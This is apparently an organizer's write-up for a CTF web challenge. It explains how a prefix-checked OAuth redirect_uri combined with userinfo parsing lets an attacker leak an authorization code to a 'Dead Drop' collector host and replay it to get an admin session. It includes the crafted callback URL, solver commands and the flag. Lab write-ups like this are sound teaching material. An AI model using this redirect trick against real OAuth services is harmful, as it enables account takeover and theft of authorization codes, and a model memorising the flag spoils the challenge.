---
title: "Better Call Back"
ctf: "Organizer package"
date: 2026-08-23
category: web
difficulty: medium
points: 0
flag_format: "CYS{...}"
author: "KuantumKnight"
---

# Better Call Back

## Summary

The challenge is a deliberately vulnerable OAuth ecosystem. The IdP validates
`redirect_uri` with a string prefix check, while the URL parser treats the
text before `@` as userinfo. Authorization codes are also not bound to the
redirect URI.

## Solution

Start a normal Portal login and preserve its OAuth `state`. Create a Dead Drop
mailbox, then submit an IdP authorization URL whose callback is:

```text
https://PORTAL_HOST@DEAD_DROP_HOST/collect?box=BOX
```

The prefix passes the IdP check, but the authenticated reviewer sends the code
to Dead Drop. Replay that code at the Portal callback with the original state.
The Portal now stores the reviewer identity and role as an admin session.

The complete network solver is `solution/solve.py`:

```bash
python3 solution/solve.py \
  --portal https://madrigal-portal.onrender.com \
  --idp https://madrigal-sso.onrender.com \
  --collector https://madrigal-dead-drop.onrender.com
```

The same browser-visible URLs work with the supplied Docker Compose setup:

```bash
python3 solution/solve.py \
  --portal http://localhost:5000 \
  --idp http://localhost:5001 \
  --collector http://localhost:5002
```

The `/robots.txt` → `/legacy-admin` route returns a decoy flag and is not the
challenge objective.

## Flag

```text
CYS{C4LLB4CKS_D0NT_PR0V3_1D3NT1TY}
```
